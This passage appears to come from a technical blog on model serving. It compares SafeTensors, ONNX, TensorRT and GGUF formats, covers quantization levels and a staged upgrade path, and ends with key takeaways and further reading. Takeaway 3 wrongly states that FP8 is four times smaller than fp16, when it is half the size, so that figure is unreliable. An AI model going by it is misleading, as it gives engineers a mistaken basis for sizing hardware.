
*Quantization level selection for GGUF*: the right k-quant level depends on your quality floor and memory budget. For tasks where output quality is critical (code generation, medical text), use Q5_K_M or Q6_K — the perplexity degradation is under 3% vs fp16. For tasks tolerant to minor quality loss (summarization, translation), Q4_K_M hits the sweet spot: 4.7 GB for Llama-3-8B, under 5% perplexity regression, 2–3x faster on CPU than Q8_0. Avoid Q2_K and Q3_K_S for production — the accuracy loss is too high for most real tasks even if the speed gain seems attractive.

### 14.1 The upgrade path: start simple, optimize with evidence

Every format choice should be driven by measured data, not speculation. The recommended progression for a new deployment is:

1. **Start with SafeTensors + vLLM** (or TorchServe for non-LLM models). This gets you to production in days, not weeks. Collect real traffic data: p99 TTFT, TPOT, GPU utilization, and cost per request.
2. **Evaluate the economics at your actual traffic level.** At low QPS (under 50 requests/minute), the GPU is underutilized regardless of format — adding TRT complexity does nothing. At high QPS (over 200 requests/minute sustained), the throughput multiplier from TRT or GGUF quantization becomes cost-meaningful.
3. **Optimize one format dimension at a time.** First try GPTQ or AWQ quantization within vLLM (no format change, just a quantized SafeTensors checkpoint) — this often delivers 1.5–2x throughput gain with minimal engineering cost. Only pursue TensorRT if quantized vLLM still does not meet your cost targets.
4. **Measure before and after every format change.** Use the same benchmark harness, same hardware, same request distribution. Format changes introduce subtle behavioral differences (numerical precision, padding behavior, sequence length handling) that only show up at scale.

---

## 15. Key takeaways

1. **Never serve pickle checkpoints.** SafeTensors is a drop-in replacement with 5–8x faster cold starts and no attack surface. The migration takes hours, not days.

2. **Format determines which runtimes you can use.** A `.pt` pickle file runs on PyTorch only. ONNX runs on ten-plus runtimes. A TensorRT engine runs only on the exact GPU microarchitecture it was compiled for.

3. **TensorRT FP8's gains are real and calculable.** The 3–5x throughput over fp16 traces directly to the bandwidth and compute equations: FP8 is 4x smaller than fp16 and runs at 2x compute throughput on H100 tensor cores.

4. **GGUF is the right answer for CPU inference, edge, and developer tools.** Q4_K_M Llama-3-8B at 4.7 GB fits in 6 GB RAM, runs without Python, ships as a single binary, and costs nothing per inference on commodity hardware.

5. **ONNX is the cross-platform bridge, not the performance choice.** It is correct for BERT-class models on mixed hardware fleets. It is not the right choice for LLM GPU serving, where vLLM/TGI + safetensors outperform ORT on every axis.

6. **SafeTensors mmap is why vLLM loads fast.** Both vLLM and TGI load safetensors shards via OS mmap directly — no copy, no deserialization. The page-sharing property means multiple workers on the same node share physical RAM for model weights.

7. **Dynamic ONNX export is mandatory.** Static-shape ONNX exports are useless in production. Always export with `dynamic_axes` for batch and sequence dimensions.

8. **TensorRT engines belong in CI.** Engine files are architecture-specific compiled artifacts, like binaries. Build them in CI, version them in an artifact registry, and promote them through the same deploy pipeline as model weight updates.

9. **KV cache memory does not benefit from weight quantization.** Quantizing Llama-3-8B weights from fp16 to INT4 saves 12 GB VRAM. But each concurrent sequence still needs 4.3 GB for KV cache in fp16. Total concurrent capacity is determined by weight memory plus KV cache memory — not weights alone.

10. **Start with SafeTensors + vLLM, optimize toward TRT only when needed.** Get to production with safetensors, measure p99 and cost, and only invest in TensorRT if the benchmarks justify the operational complexity. Most production services do not need TRT's peak performance.

---

## 16. Further reading

- [SafeTensors specification and security analysis](https://github.com/huggingface/safetensors) — HuggingFace, 2022. Design doc and security rationale for the binary layout.
- [ONNX Runtime documentation — execution providers](https://onnxruntime.ai/docs/execution-providers/) — Microsoft, 2024. Official guide to EP selection and configuration options.
- [NVIDIA TensorRT Developer Guide](https://docs.nvidia.com/deeplearning/tensorrt/developer-guide/) — NVIDIA, 2024. Comprehensive engine building, INT8 calibration, and optimization profile reference.
- [GGUF format specification](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md) — Georgi Gerganov, 2023. Binary layout, k-quant mathematics, and tokenizer embedding specification.
- [HuggingFace Optimum — ONNX export for LLMs](https://huggingface.co/docs/optimum/exporters/onnx/overview) — HuggingFace, 2024. The correct toolchain for exporting transformer models to ONNX with KV cache.
- [vLLM: Efficient Memory Management for Large Language Model Serving with PagedAttention](https://arxiv.org/abs/2309.06180) — Kwon et al., 2023. The PagedAttention paper; explains why vLLM's safetensors loading is architecturally inseparable from its memory manager.
- [What is model serving](/blog/machine-learning/model-serving/what-is-model-serving) — series intro; the SLO triangle and the serving vs training distinction.
- [The model serving playbook](/blog/machine-learning/model-serving/the-model-serving-playbook) — series capstone; full decision tree from model to production.
- [Model serving SLAs and metrics](/blog/machine-learning/model-serving/model-serving-slas-and-metrics) — how to measure the load-time, TPOT, and throughput gains quantified here.
- [Quantization for LLM serving](/blog/machine-learning/model-serving/quantization-for-llm-serving) — Track C6; GPTQ, AWQ, FP8, and SmoothQuant in depth for LLMs.
